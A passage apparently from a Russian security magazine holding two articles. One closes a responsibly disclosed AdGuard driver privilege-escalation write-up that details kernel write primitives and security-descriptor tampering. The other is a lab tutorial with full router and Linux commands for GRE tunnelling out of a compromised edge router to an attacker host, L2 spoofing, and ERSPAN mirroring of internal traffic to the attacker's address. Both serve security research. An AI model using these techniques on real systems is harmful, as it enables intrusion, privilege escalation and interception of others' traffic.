Без аргументов DIBF брутфорсит коды IOCTL и так же брутфорсом определяет
размеры входных буферов для IOCTL. В результате первого запуска создается
файл dibf-bf-results.txt.


$ type dibf-bf-results.txt
\\ . \CtrlSM_Protected2adgnetworkwfpdrv
22019c 0 2000 <--- IOCTL, min buffer size, max buffer size
22019d 0 2000
...

Вторым запуском DIBF читает из файла IOCTL, и начинается фаззинг. Ждем
пятнадцать минут и видим результат. Это тот редкий случай, когда BSOD
вызывает радость! Падение произошло в исследуемом драйвере.





Спасибо Оккаму и его бритве за фаззинг без сверхнеобходимых сущностей.
Проанализируем результаты. Откроем в WinDbg файл MEMORY.DMP, который
Windows собрала при падении, выполним команду analyze -v и посмотрим
на стектрейс.





                         Стектрейс при падении ОС

В WinDbg имеем снапшот оперативной памяти на момент падения. Вытаскива‐
ем из него базовый адрес модуля adgnetworkwfpdrv.sys и уже точечно
начинаем смотреть, что же произошло.


РЕВЕРС ДРАЙВЕРА

Вот функция, в которой случилось падение.





                               Место BSOD

Видно, что происходит обход какого‑то списка в цикле while. Чтобы не рас‐
тягивать статью, я сразу расскажу про результаты реверса и покажу данные,
с которыми работает драйвер.
   Итак, драйвер создает paged pool область памяти с тегом FLT3. Там содер‐
жится список указателей на хеды singly-linked-списков.





  Условное разделение адресного пространства на юзермод и кернелмод.
  FLT3 находится в кернелмоде

В глобальной переменной g_AdgItemsCounter хранится количество структур
AdgItem (о них позже). Нам доступен IOCTL, который добавляет элемент
в список, — ADG_INSERT_ITEM.





             Память ядра после вызова IOCTL ADG_INSERT_ITEM

В AdgItem.index записывается текущее значение g_AdgItemsCounter, оно же
и возвращается в ответе.
   Размер списка — 0xBCB. Если добавить в него элемент номер 0xBCC
или больше, то в список они будут добавляться как бы следующим уровнем.





      Память ядра после многократного вызова IOCTL ADG_INSERT_ITEM


             INFO

                          Похоже, что здесь используется какой‑то хитрый
                          многоуровневый  список. Я  так  и  не  понял,
                      для чего это нужно. Если тебе знакома такая
                           организация данных, поделись в комментах.


Также нам доступен IOCTL-вызов ADG_EDIT_ITEM, который позволяет редак‐
тировать AdgItem по индексу. Контролируемые данные выделены красным.





Мы контролируем адрес следующего элемента в списке! Важно так‐
же отметить, что редактирование данных выполняется после успешного срав‐
нения на равенство переданного индекса c adgItem.index.


ПО СЛЕДАМ ФАЗЗЕРА

DIBF вызвал ADG_INSERT_ITEM много‑много раз, затем через ADG_EDIT_ITEM
повредил один из элементов списка. При следующем вызове ADG_EDIT_ITEM
совершается обход этого списка в цикле while до момента, когда будет найден
нужный элемент. Еще раз приведу листинг функции, в которой произошел
BSOD, но уже с пояснениями.





               Функция поиска элемента в списке по индексу

Соответственно, в определенный момент при разыменовании adgItem.index
переходим по коррапченному указателю.





                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY
         SAD GUARD
                   ИЩЕМ И ЭКСПЛУАТИРУЕМ
                       УЯЗВИМОСТЬ В ДРАЙВЕРЕ
                        ADGUARD ДЛЯ WINDOWS





ЕЩЕ НЕМНОГО РЕВЕРСА

Через кросс‑референсы на функцию AdgGetByIndexFromPool() находим
еще один нужный IOCTL ADG_UNLINK_ITEM. Он удаляет элемент из списка
singly-linked по индексу.





  Удаление элемента из списка. Контролируемые атакующим данные
  попадают напрямую в FLT3

Поскольку мы контролируем AdgItem.pNextItem, это позволяет писать наши
данные прямо в область FLT3 по одному DWORD.


ПРИМИТИВЫ

Используя разные комбинации найденных IOCTL, мы получаем два мощных
примитива. Оба основаны на коррапте singly-linked-списка.
  Примитив  первый.  Комбинация  ADG_INSERT_ITEM,  ADG_EDIT_ITEM,
ADG_UNLINK_ITEM позволяет писать последовательность байтов в пул FLT3.
Это дает возможность крафтить фейковые структуры в памяти ядра и обходить
SMAP.





         Первый примитив. Запись последовательных байтов в FLT3

Однако в таком примитиве мало толку, если мы не знаем адрес записываемых
данных. KASLR располагает FLT3 по случайному адресу.
  Примитив  второй.  Дополняем  предыдущую  комбинацию. В IOCTL
ADG_EDIT_ITEM передадим валидные ядерные адреса и в цепочку IOCTL
добавим еще один вызов ADG_EDIT_ITEM — мощнейший примитив arbitrary
write 16 bytes, то есть «произвольно запиши 16 байт в память ядра».





               Второй примитив записи 16 байт в память ядра

Обрати внимание, что, например, первые пять DWORD в FLT3 мы можем
использовать для создания структур, а шестой — для нашего примитива про‐
извольной записи.
  На  этом  этапе  исследования  вырисовывается  возможный  эксплоит.
Используя эти примитивы, мы можем создавать свои объекты в ядре.
  Но для полноценного использования примитивов нужно решить три кри‐
тические проблемы.


Проблемы 1 и 2. KASLR
Бинарные митигации Windows усложняют эксплуатацию. Это, конечно, классно,
что мы можем заполнять FLT3 контролируемыми данными, но этого мало. Если
мы хотим скрафтить там какой‑нибудь объект ядра, нужно знать адрес, чтобы
им воспользоваться. Также нам надо знать адрес какого‑нибудь объекта ядра,
чтобы перелинковать список на него.
   Обратимся к репозиторию windows kernel address leaks. Хоть в последний
раз туда коммитили в 2017 году, техники до сих пор рабочие.





                     Таблица техник утечки адресов ядра

Большинство техник основаны на вызове вот этой недокументированной фун‐
кции из ntdll:


NtQuerySystemInformation()

Один из вызовов сможет слить адреса всех невыгружаемых пулов (non-paged
pool), где мы без труда отыщем тег FLT3. Другой вызов сливает адреса
EPROCESS’ов, токенов и так далее. Но прежде чем выбрать ядерную струк‐
туру, надо обсудить проблему номер три.


Проблема 3. Сравнение с index
Несмотря на то что мы исследуем 32-битный драйвер, в структуре adgItem
индекс хранится в двух DWORD. А значение g_AdgItemsCounter, которым он
инициализируется, хранится в одном DWORD. Следовательно, второй DWORD
всегда будет равен нулю.





                          adgItem в памяти ядра


             INFO

                        Предположу, что это связано с использованием
                            инструкции  _aullrem для деления с остатком,
                        которая работает с 64-битными целыми в 32-
                          битных системах.


0xBCC — это adgItem.index. За ним всегда будет следовать NULL DWORD
(выделены  красным).  Если  удастся  перелинковать   singly-linked-список
на какой‑нибудь объект ядра с паттерном «предсказуемый DWORD, NULL
DWORD», то сможем пройти проверку и записать следующие 16 байт контро‐
лируемыми данными (выделены черным на рисунке выше).





           Функция записи контролируемых 16 байт в память ядра

Почему первый DWORD должен быть предсказуем (то есть мы должны знать
его из юзермода заранее)? Нам надо передать в IOCTL ADG_EDIT_ITEM индекс
элемента, который будет  сравниваться с этим DWORD. Если  проверка
на равенство не прошла, то код драйвера побежит дальше по singly-linked-
списку и ОС выпадет в BSOD, аналогично тому, как это было во время фаз‐
зинга.
   Итак, подытожим, какой объект ядра нам нужен для произвольной записи:
 • адрес объекта протекает через Windows Kernel Address Leaks;
 • в лейауте объекта есть память, удовлетворяющая паттерну «предсказуемый
  DWORD, NULL DWORD». В качестве предсказуемого DWORD идеально
   подойдет DWORD с флагами;
 • изменение 16 байт за паттерном в объекте приводит к повышению при‐
   вилегий.

Ключ, позволяющий записывать 16 байт в ядре, у нас есть, осталось найти
замок, к которому этот ключ подойдет.


ЭКСПЛУАТАЦИЯ

Дальше методично изучаем репозиторий Windows Kernel Address Leaks, смот‐
рим,  какие  структуры ядра  протекают, и ищем  что‑нибудь подходящее
под критерии выше.
   Можно ликануть адрес структуры EPROCESS, а значит, можно вычислить
адрес OBJECT_HEADER:


EPROCESS - sizeof(OBJECT_HEADER)

Давай   взглянем  на   структуру  OBJECT_HEADER   сервисного   процесса
AdguardSvc.exe.


             INFO

                    Для  эксплуатации  подойдет OBJECT_HEADER
                      любого привилегированного процесса, просто я
                          выбрал процесс сервиса этого же вендора.





Красным выделена память, подходящая под  паттерн, —  предсказуемый
DWORD равен шести, за ним следует NULL DWORD. Шесть — это количество
открытых хендлов для объекта процесса OBJECT_HEADER.HandleCount.
   Эксплоит получается не самый надежный, потому что мы не контролируем
тех, кто открывает хендл. Если, например, антивирус решит открыть процесс
для сканирования памяти, то это значение станет равным семи и эксплоит уро‐
нит ОС в BSOD. Но мы не пишем эксплоит на продажу, а изучаем устройство
Windows, поэтому слегка пожертвуем надежностью.
   Паттерн мы нашли, значит, можно будет перезаписать следующие 16 байт,
а среди них — указатель на дескриптор безопасности (Security Descriptor)!
Это указатель типа EX_FAST_REF на структуру, которая содержит DACL и опи‐
сывает права доступа к объекту.


        WWW

                        Подробнее про  указатель типа EX_FAST_REF
                       на сайте CodeMachine.





            Security Descriptor высокопривилегированного процесса

Обрати внимание на наличие флагов SE_DACL_PRESENT и SE_SACL_PRESENT. Их
присутствие значит, что DACL и SACL заданы явно. DACL содержит два ACE —
высокопривилегированные пользователи NT SYSTEM и члены группы админис‐
траторов могут открыть хендл процесса для разных операций.
  C SACL все не так очевидно. System Access Control List (SACL) содержит
не только атрибуты логирования доступа к объекту, но и его уровень целос‐
тности (integrity level), очень важное поле, когда мы говорим о защите объ‐
ектов в Windows. В нашем случае это высокий уровень целостности ML_SYSTEM.
   Что будет, если мы выключим эти флаги? DACL и SACL станут NULL.





                  Security Descriptor после выключения флагов

А что значит NULL-указатель в этих полях для дескриптора безопасности?
Обратимся к MSDN. Там написано, что DACL, равный null, дает полный доступ
любому  пользователю,  который  его  запросит.  Звучит  многообещающе!
Нулевой SACL значит , что «объект будет обрабатываться как имеющий сред‐
нюю целостность». Обычный пользователь как раз имеет средний уровень
целостности.
   Говоря простым языком, привилегированный объект с DACL/SACL, равным
NULL, может быть открыт  простым  пользователем.  Получаем  локальное
повышение привилегий.
  Это  легко  проверить.  Откроем  AdguardSvc.exe  после  выключения
SE_DACL_PRESENT и SE_SACL_PRESENT и попробуем инжектнуть в процесс
какую‑нибудь DLL. Успех.





  Инжект DLL в привилегированный процесс после отключения флагов
  SE_DACL_PRESENT, SE_SACL_PRESENT


             INFO

                           Грубо говоря, при открытии объекта субъектом
                          компонент Windows  Security Reference Monitor
                            сравнивает SID в токене субъекта (пользователя)
                        с ACE в дескрипторе безопасности объекта. Дес‐
                          крипторы безопасности уже были в моей статье,
                       а про токен ты можешь почитать в статье « Изу‐
                      чаем возможности WinAPI для пентестера ».


Это значит, что первым примитивом мы можем скрафтить слабый Security
Descriptor в FLT3-области памяти и вторым примитивом переписать указатель
на него.
   Однако примитивом мы переписываем 16 байт, из них указатель занимает
только четыре. Давай еще раз взглянем на OBJECT_HEADER и посмотрим, что
находится под остальными 12 байтами.





  16 байт (4 DWORD), которые перезаписываются в обязательном порядке
  (выделены черным)

Оставшиеся 12 байт из 16 тоже надо проверить. ObjectCreateInfo можно
переписать  нулями, и BSOD’а не  будет.  Проверено  экспериментально.
Про дескриптор безопасности мы уже поговорили. EPROECSS.Header.Lock
имеет константное значение 3, спокойно перезаписываем тем же значением.
С флагами 0x88 та же история. Остался один байт 0xC4 OBJECT_HEADER.
TypeIndex.
  В Windows 10 OBJECT_HEADER.TypeIndex — это указатель в таблице nt!
ObTypeIndexTable,  поксоренный  с nt!ObHeaderCookie.  Значение nt!
ObHeaderCookie нам, юзермодным эксплуататорам, неизвестно. Значит, мы
не знаем, чем его перезаписывать, используя примитив.


        WWW

                    A  Light  on  Windows  10’s  “OBJECT_HEADER-
                        >TypeIndex” — хорошая статья на тему TypeIndex
                        в разных версиях ОС.


Таким образом Windows предотвращает атаку через использование функции
ObfDereferenceObject(). Повредив TypeIndex, можно перехватить управле‐
ние в ядре. Более подробно читай в статье CVE-2018-8611 Exploiting Windows
Аарона Адамса.
   Ломает ли это эксплуатацию? Нет. Во‑первых, коррапт OBJECT_HEADER.
TypeIndex не вываливает Windows в BSOD. Мы всего лишь получим ошибку
при вызове CreateProcess() из юзермода.
   Проведем простой эксперимент: откроем notepad.exe, в WinDbg пов‐
редим его TypeIndex и попробуем открыть процесс.





  Ошибка при открытии процесса с поврежденным
  OBJECT_HEADER.TypeIndex

Теперь восстановим значение и попробуем сделать это снова.



                     Успешное выполнение команды

TypeIndex — это всего лишь байт, значит, его можно быстро сбрутить —
используем  примитив  arbitrary  write 16  bytes с новым OBJECT_HEADER.
TypeIndex (но с тем же самым дескриптором безопасности) и пробуем выз‐
вать следующую функцию:


CreateProcess(PROCESS_ALL_ACCESS)

Когда подберем нужное значение, нам вернется хендл процесса. После этого
сервисный процесс  становится полностью подконтрольным, и мы можем
инжектиться в него как угодно. Я буду делать это классической комбинацией
WriteProcessMemory() + CreateRemoteThread().
   Цепочка атаки готова. Пройдемся по ее шагам еще раз.
  Шаг  0. Начальное  состояние. Пул FLT3  пустой. Сервисный процесс
защищен строгим дескриптором безопасности.





Шаг 1. Ликаем адрес в пространстве ядра FLT3 и EPROCESS AdguardSvc.exe.





Важное    примечание:   SYSTEM_HANDLE_INFORMATION    сливает    адреса
EPROCESS, и по одному адресу не понять, какому юзермодному процессу он
принадлежит. Поэтому здесь используем эвристику:
 • собираем все EPROCESS первый раз;
 • запускаем сервис, благо эта операция доступна непривилегированному
   пользователю. Стартует процесс AdguardSvc.exe;
 • собираем все EPROCESS второй раз;
 • ищем разницу двух множеств, единственный найденный EPROCESS будет
   принадлежать AdguardSvc.exe.

Едем дальше.
  Шаг 2. Через примитив записи в FLT3 заносим туда слабый дескриптор
безопасности (DACL/SACL NULL). Поскольку адрес FLT3 нам известен из пре‐
дыдущего шага, мы знаем, по какому адресу ядра произошла запись.





Важное примечание: Chunk в FLT3 — это четыре DWORD’а: NULL, 8, NULL,
NULL}.  Их  нужно  поместить  перед  дескриптором  безопасности,  чтобы
не получить BSOD с INVALID_REF_COUNT. Предполагаю, что это служебная
инфа хип‑менеджера.
  Шаг 3. С помощью примитива arbitrary write 16 bytes перезаписываем ука‐
затель на дескриптор безопасности с исходного на слабый.





Шаг 4. Используя этот же примитив, брутфорсим OBJECT_HEADER.TypeIndex,
пока не получим хендл сервисного процесса.





Шаг 5. Инжектимся в сервисный процесс. Таким образом мы повысили при‐
вилегии в системе. Код эксплоита я опубликовал на своем GitHub.


ДЕМОНСТРАЦИЯ (ВИДЕО)





Таймлайн

 • 17.08.2022 — уязвимость зарепорчена вендору;
 • 17.08.2022 — вендор взял репорт в работу;
 • 26.08.2022 — подтверждение от вендора, выплата багбаунти;
 • 24.10.2022 — фикс в версии 7.11 ;
 • 27.01.2023 — публикация.
ВЗЛОМ





                        КАК РАБОТАЕТ
                     GRE-ПИВОТИНГ
                   ПОВЕРХ СЕТЕВОГО
                   ОБОРУДОВАНИЯ




При настройке средств защиты сетевое
оборудование  часто  остается без  вни‐
мания  администраторов,  что повышает
вероятность взлома и получения контроля
над такими устройствами. Что, если зло‐              Caster                                                                                       Network Security Expert
умышленник   уже   добился    контроля           t.me/c4s73r_channel                                                                                     c4s73r@protonmail.com
над пограничным оборудованием? Смо‐
жет  ли  он  подобраться  к  внутренней
инфраструктуре?


Пивотинг (от английского pivoting, а не от слова «пиво») — это набор техник,
которые позволяют получить доступ к внутренним ресурсам, минуя сетевую
изоляцию, сетевые средства защиты, файрвол. Достаточно много было ска‐
зано о проведении пивотинга через традиционные службы SSH, OVPN и дру‐
гие. Но в своем исследовании я продемонстрирую нетрадиционные приемы
пивотинга сквозь пограничное сетевое оборудование с использованием про‐
токола GRE.


           WARNING

                       Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный  с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



GRE

GRE (Generic Routing Encapsulation) — это протокол инкапсуляции сетевых IP-
пакетов, разработанный инженерами Cisco. В продакшене он получил боль‐
шую  популярность,  поскольку  решает  проблемы  создания  VPN-каналов
для организаций. GRE проводит инкапсуляцию напрямую в IP-пакет, минуя
транспортный уровень. Кстати говоря, в контексте IP-пакета у GRE есть свой
числовой идентификатор — 47. По сути, GRE не  предоставляет никаких
средств защиты туннелируемых данных. Поэтому в продакшене обычно скре‐
щивают GRE и IPSec для обеспечения безопасности данных. В этой статье я
совсем немного расскажу о GRE, чтобы ты понимал, зачем он нам понадобил‐
ся.





                        Простой пример GRE-туннеля

GRE-туннелирование здесь подразумевает три сущности:
 • Delivery Header.  Представляет собой IP-пакет с публичными адресами
   источника/назначения. Благодаря ему инкапсулированный пакет сможет
   достичь адресата в сети Интернет. Его размер — 20 байт;
 • GRE-пакет. Его размер — 4 байта;
 • пассажир. Это полезные данные, трафик, сгенерированные легитимными
   службами.





                         Служебные заголовки GRE





                           Структура GRE версии 0

У GRE есть две версии — 0 и 1. На картинке выше представлена структура
нулевой  версии  протокола GRE.  Именно  она  обычно и  используется.
Как видишь, большинство заголовков здесь опциональные, то есть хранимые
там значения есть не всегда и появляются лишь в специфичных сценариях.
GRE также носит идентификатор инкапсулирующего протокола в заголовке
Protocol Type. Под каждый протокол есть свой идентификатор: например,
для пакета IPv4 этот идентификатор равен 0x0800.





              Идентификатор IPv4-пакета внутри GRE-заголовка


        WWW

                        Подробнее о GRE читай в документе RFC.




ЛАБОРАТОРНАЯ СЕТЬ

В качестве лабораторного стенда выступит сеть, изображенная на схеме.





                          Топология лабораторной сети

Это типичная корпоративная сеть с тремя уровнями (уровень доступа, распре‐
деления и ядра). В качестве динамической маршрутизации используется про‐
токол OSPF, для отказоустойчивости доступности шлюза — HSRP. Имеем
четыре коммутатора уровня доступа и четыре сети VLAN со своей адресацией.
Также подключен отдельный коммутатор уровня распределения, за ним сеть
192.168.20.0/24.
  В качестве Edge Router будут выступать Cisco CSR и Mikrotik CHR v. 6.49.6.
  С атакующей стороны машина с Kali Linux и публичным IP-адресом —
для примера атаки из интернета. Предположим, что атакующий каким‑то обра‐
зом получил доступ к панели управления пограничным маршрутизатором, пос‐
кольку продемонстрировать мы хотим пивотинг, а это, как известно, один
из шагов во время постэксплуатации.


L3 GRE VPN ПОВЕРХ CISCO IOS

Продемонстрирую небольшой пример организации L3-туннеля во внутреннюю
сеть, которая находится за самим пограничным роутером. Вообще, принципы
настройки GRE не отличаются у всех вендоров сетевого оборудования, вопрос
лишь в разном синтаксисе. Давай для начала посмотрим, как настраивать
Cisco.
   Конфигурация GRE в Cisco IOS включает следующее:
 • создание логического интерфейса;
 • указание режима, в котором будет работать туннель (GRE);
 • назначение адреса на интерфейс (здесь возьмем адреса 172.16.0.1
   для Kali и 172.16.0.2 для Cisco CSR);
 • задание адреса источника 212.100.144.100;
 • задание адреса назначения 100.132.55.100.


EdgeGW(config)# interface tunnel 1
EdgeGW(config-if)# tunnel mode gre ip
EdgeGW(config-if)# ip address 172.16.0.2 255.255.255.0
EdgeGW(config-if)# tunnel source 212.100.144.100
EdgeGW(config-if)# tunnel destination 100.132.55.100

Теперь черед второй стороны GRE-туннеля. В нашем случае этой «второй сто‐
роной» будет хост атакующего. Linux прекрасно поддерживает работу с GRE
при наличии необходимого модуля ядра ip_gre. А он есть почти везде.
   Здесь шаги такие:
 • импорт модуля ядра;
 • создание логического интерфейса с указанием типа, адресов источника
   и назначения;
 • назначение адреса на логическом интерфейсе;
 • включение интерфейса.


c4s73r@kali:~$ sudo modprobe ip_gre
c4s73r@kali:~$ sudo ip link add name evilgre type gre local 100.
132.55.100 remote 212.100.144.100
c4s73r@kali:~$ sudo ip addr add 172.16.0.1/24 dev evilgre
c4s73r@kali:~$ sudo ip link set evilgre up

Проверим работу туннеля через пинг до туннельного интерфейса Cisco CSR.





               Пинг атакующего до второй стороны туннеля





                          Пинг от Cisco CSR

Посмотрим на таблицу маршрутизации, добавим некоторые маршруты до под‐
сетей, чтобы проверить доступность.





          Таблица маршрутизации пограничного роутера Cisco CSR

Прописываем маршруты до целевых подсетей. Адресом шлюза в данном слу‐
чае будет адрес логического GRE-интерфейса роутера Cisco CSR — 172.16.
0.2.


c4s73r@kali:~$ sudo route add -net 10.10.50.0 netmask 255.255.255.
0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 10.10.110.0 netmask 255.255.
255.0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 10.10.140.0 netmask 255.255.
255.0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 10.10.210.0 netmask 255.255.
255.0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 192.168.20.0 netmask 255.255.
255.0 gw 172.16.0.2


c4s73r@kali:~$ sudo nmap -n -p 22 -iL targets -oA result





           Результаты сканирования SSH внутренней инфраструктуры

Примерно так будет выглядеть пакет с инкапсуляцией, если атакующий вза‐
имодействует с внутренней сетью (ICMP, на примере внутренней подсети наз‐
начения 192.168.20.0/24).





L3 GRE VPN ПОВЕРХ ROUTEROS

Теперь продемонстрирую пример на оборудовании Mikrotik. Здесь абсолютно
те же принципы настройки, разница лишь в синтаксисе и иерархии расположе‐
ния сущностей (интерфейсы, IP-адресация и так далее).


             INFO

                      Здесь приведены команды именно для RouterOS
                                   v. 6.


Создаем логический интерфейс GRE, назначаем ему адрес, прописываем
адрес удаленной стороны:


[admin@EdgeGW] /interface/gre> add name=gre_pivoting remote-
address=100.132.55.100 allow-fast-path= no
[admin@EdgeGW] /interface/address> add address=172.16.0.2 netmask=
255.255.255.0 interface=gre_pivoting

Сторона атакующего. Все то же самое, что было в части про L3 VPN поверх
Cisco:


c4s73r@kali:~$ sudo modprobe ip_gre
c4s73r@kali:~$ sudo ip link add name evilgre type gre local 100.
132.55.100 remote 212.100.144.100
c4s73r@kali:~$ sudo ip addr add 172.16.0.1/24 dev evilgre
c4s73r@kali:~$ sudo ip link set evilgre up

Проверим работу туннеля GRE и ICMP:


[admin@EdgeGW] > ping 172.16.0.1





c4s73r@kali:~$ ping 172.16.0.2





Смотрим в таблицу маршрутизации /ip route print и добавляем некоторые
маршруты для проверки сетевой связности.





c4s73r@kali:~$ sudo route add -net 10.10.50.0 netmask 255.255.255.
0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 10.10.110.0 netmask 255.255.
255.0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 10.10.140.0 netmask 255.255.
255.0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 10.10.210.0 netmask 255.255.
255.0 gw 172.16.0.2
c4s73r@kali:~$ sudo route add -net 192.168.20.0 netmask 255.255.
255.0 gw 172.16.0.2

Проверим сетевую связность до хостов этих подсетей. ICMP Ping Sweep.





Вот таким образом можно обеспечить L3 GRE туннель на примере Cisco IOS
и RouterOS. Однако в продакшене встречаются разные сетевые инфраструк‐
туры  со  специфическими  конфигурациями  оборудования.  Желательно
перед построением GRE-туннеля полностью изучить конфигурацию маршру‐
тизатора — вдруг дальнейшему прохождению трафика мешает ACL или, нап‐
ример, есть нужда в анонсировании сети GRE-туннеля, если мы говорим
о динамической маршрутизации.


ОБЕСПЕЧЕНИЕ ТУННЕЛЯ L2 GRE С ПОДДЕРЖКОЙ L2-АТАК

Для решения этой проблемы существует TAP-интерфейс. TAP — это виртуаль‐
ный сетевой драйвер, он позволяет эмулировать Ethernet-устройство и работа‐
ет на канальном уровне сети (L2), оперирует именно Ethernet-кадрами. Сам
GRE отлично работает с TAP-интерфейсами: Ethernet-кадр будет инкапсулиро‐
ван в туннель GRE, что, в свою очередь, дает возможность L2-доступа до цели.
Вообще, TAP-интерфейсы используются в продакшене для создания сетевых
мостов.
  Сам туннель L2 мы построим поверх туннеля L3, то есть получится GRE over
GRE. Через туннель L3 мы сможем создать туннель L2 до целевой машины
Relapse (предполагается, что атакующий уже получил контроль над ней). Эта
машина представляет собой сервер на Ubuntu 22.04 с двумя интерфейсами.
  На стороне атакующего идентичная ситуация с настройкой GRE L3, однако
создаем именно интерфейс GRETAP.


c4s73r@kali:~$ sudo modprobe ip_gre
c4s73r@kali:~$ sudo ip link add name evilgretap type gre local
172.16.0.1 remote 192.168.20.20
c4s73r@kali:~$ sudo ip link set evilgretap up

Сторона целевого хоста. Выясним, что здесь с интерфейсами.





                        Интерфейсы машины Relapse




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ
            PIVOTING
             DISTRICT
                                    КАК РАБОТАЕТ
                                GRE-ПИВОТИНГ
                 ПОВЕРХ СЕТЕВОГО ОБОРУДОВАНИЯ





                       Схема построения туннеля L2

На машине  Relapse  два  физических  интерфейса.  Второй  физический
интерфейс eth1 смотрит в некую подсеть, о которой мы не знали. Импорти‐
руем модуль для работы с GRE, создаем интерфейс GRETAP, создаем сетевой
мост, куда мы поместим сам GRE и тот физический интерфейс.


c4s73r@Relapse:~$ sudo modprobe ip_gre
с4s73r@Relapse:~$ sudo ip link add name eviltap type gre local
192.168.20.20 remote 172.16.0.1
c4s73r@Relapse:~$ sudo brctl addbr internal
c4s73r@Relapse:~$ sudo brctl addif internal eviltap
c4s73r@Relapse:~$ sudo brctl addif internal eth1
c4s73r@Relapse:~$ sudo ip link set internal up
c4s73r@Relapse:~$ sudo sysctl -w net.ipv4.ip_forward= 1

Запустим Wireshark на стороне атакующего, на TAP-интерфейсе.





В трафике обнаруживаем работу протоколов STP и DTP, это говорит о том, что
мы сумели попасть в канальный сегмент.
   Как видим в трафике (Wireshark был запущен для интерфейса evilgretap),
добавился еще один заголовок GRE. Его идентификатор равен 0x6558, что
говорит о взаимодействии GRE с Ethernet-мостом.





Попробуем получить адрес по DHCP:


c4s73r@kali:~$ sudo dhclient -v evilgretap





                         Полученный по DHCP адрес


             INFO

                    Во время получения адреса по DHCP из TAP-
                        интерфейса возможно добавление другого мар‐
                          шрута по умолчанию, который может нарушить
                      сетевую  связность.  Внимательно  изучай свою
                          таблицу маршрутизации во время траблшутинга
                      и удали, что нужно, из таблицы маршрутизации.


Таким образом, мы получаем доступ к L2-контуру с машины Relapse и воз‐
можность проводить L2-атаки.





                    LLMNR/NBNS Poisoning





                   Взломанный пароль пользователя user





                      ARP Spoofing, part 1





                      ARP Spoofing, part 2


ВОЗМОЖНЫЕ ПРОБЛЕМЫ С MTU

В  компьютерной сети  есть  такое  понятие,  как MTU. Это  специальный
параметр, который  указывает на максимальный размер полезных данных
во вложении. MTU есть и на физическом интерфейсе, и на туннельном.
На физическом интерфейсе без применения Jumbo Frame максимальный MTU
составляет 1500 байт, то есть только 1500 байт можно вложить в Ethernet.
  А что с GRE? Это ведь  логический интерфейс. MTU на туннельном
интерфейсе GRE составляет 1476 байт. Такой MTU говорит только о том, что
размер полезных данных необходимо уменьшить до 24 байт, чтобы кадр про‐
шел через туннельный интерфейс без выполнения фрагментации.
   Почему именно 24 байта? Потому что во время возникновения GRE-
инкапсуляции добавляются два заголовка:
 • Delivery Packet, он равен 20 байтам;
 • GRE-заголовок, равен 4 байтам.

В случае L2 GRE over L3 GRE MTU на туннельном интерфейсе вообще должен
быть 1472 байта, поскольку занимаются 28 байт (из‑за второго GRE-заголов‐
ка).
  Но на самом деле туннельный интерфейс GRE сможет работать согласно
MTU  физического  интерфейса,  то  есть  передавать  полезные  данные
в Ethernet-кадре размером 1500 байт включительно.
  При необходимости можно увеличить MTU на туннельном интерфейсе, если
возникают задержки и проблемы с передачей данных. Во время увеличения
MTU туннельного интерфейса передаваемые IP-пакеты будут подвергаться
фрагментации, поскольку сам интерфейс GRE позволяет пропускать через
себя больше данных размером 1476 байт. Однако фрагментации может
помешать специальный DF-бит в IP-пакете. Этот бит в принципе запрещает
фрагментацию пакета.
   Для Cisco IOS:


PWNED(config)# interface tunnel X
PWNED(config-if)# ip mtu 1514

Для RouterOS v. 6:


[admin@EdgeGW] /interface gre> set mtu= 1514 name=gre_pivoting

До повышения MTU оригинальный пакет (пассажир) упирался бы в 1476 байт,
а пакет может быть и не фрагментирован из‑за специального DF-бита,
который запрещает фрагментацию IP-пакета. Но после повышения MTU ори‐
гинальный пакет не будет упираться в это ограничение, а фрагментироваться
начнет второй IP-пакет (Delivery Packet), который здесь из‑за GRE-инкапсу‐
ляции, а у этого Delivery Packet DF-бита нет.


        WWW

                            Если ты впервые сталкиваешься с темой MTU,
                       она может  оказаться сложной для понимания.
                         Поэтому рекомендую разобраться подробнее.
                    •Maximum transmission unit (Wikipedia)
                     •What is MTU? (блог Cloudflare)
                       •Network Basics — Maximum Transmission Unit
                           (YouTube)



ПЕРЕХВАТ ТРАФИКА С ПОМОЩЬЮ CISCO ERSPAN

ERSPAN (Encapsulated Remote Switch Port Analyzer) — это функция зеркалиро‐
вания трафика, однако, в отличие от SPAN/RSPAN, она может передавать зер‐
калированный трафик поверх канала L3. Кстати говоря, она также использует
протокол инкапсуляции GRE для передачи данных поверх L3-соединений.
Этим может воспользоваться атакующий и проанализировать трафик внут‐
ренней инфраструктуры в поисках чувствительных данных либо узнать особен‐
ности инфраструктуры. ERSPAN — это проприетарная разработка Cisco, поэто‐
му продемонстрирую вариант перехвата трафика именно на оборудовании
Cisco.
  Я буду зеркалировать трафик с интерфейса gi2 на IP-адрес 172.16.0.1 —
это адрес туннельного интерфейса GRE системы атакующего. Приступим
к конфигурации. Основные параметры здесь:
 • идентификатор сессии ERSPAN;
 • интерфейс источника;
 • указание ERSPAN ID;
 • IP-адрес, куда будет отправляться зеркалированный трафик;
 • IP-адрес источника зеркалированного трафика;
 • MTU (1900).


CSR(config)#monitor session 337 type erspan-source
CSR(config-mon-erspan-src)#source interface gigabitEthernet 2
CSR(config-mon-erspan-src)#no shutdown
CSR(config-mon-erspan-src)#destination
CSR(config-mon-erspan-src-dst)#erspan-id 337
CSR(config-mon-erspan-src-dst)#ip address 172.16.0.1
CSR(config-mon-erspan-src-dst)#origin ip address 172.16.0.2
CSR(config-mon-erspan-src-dst)#mtu 1900
CSR(config-mon-erspan-src-dst)#end

На этом  конфигурация  закончена. Можно приступить  к  анализу  трафика
на нашем интерфейсе GRE.





                          Перехваченный трафик OSPF

После конфигурации ERSPAN мы перехватываем весь трафик с интерфейса
gi2. Например, в дампе трафика запечатлено наличие протокола OSPF. Обра‐
тив внимание на заголовки, видим, что среди них есть заголовок ERSPAN. То
есть оригинальный трафик, который был зеркалирован для отправки до адре‐
